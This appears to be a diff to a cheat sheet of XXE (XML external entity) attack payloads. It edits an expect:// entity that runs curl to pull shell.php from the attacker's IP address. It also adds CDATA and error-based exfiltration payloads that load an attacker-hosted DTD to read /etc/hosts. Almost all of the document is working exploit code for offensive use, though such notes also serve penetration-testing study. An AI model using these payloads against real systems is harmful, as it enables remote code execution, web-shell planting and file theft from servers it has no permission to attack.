@@ -1368,7 +1368,7 @@ $ sudo python3 -m http.server 80
 
 <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
-   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<IP address>/shell.php'">
    ]>
    <root>
       <name>
@@ -1430,6 +1430,34 @@ $ python3 -m http.server 8000
    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
    <!ENTITY % xxe SYSTEM "http://<IP address>:8000/xxe.dtd"> <!-- reference our external DTD -->
    %xxe;
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &joined;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
+- Advanced Error-Based Exfiltration
+
+```
+$ echo '<!ENTITY % file SYSTEM "file:///etc/hosts">' > xxe.dtd
+$ echo '<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">' >> xxe.dtd
+$ python3 -m http.server 8000
+
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [ 
+   <!ENTITY % remote SYSTEM "http://<IP address>:8000/xxe.dtd">
+   %remote;
+   %error;
    ]>
    <root>
       <name>
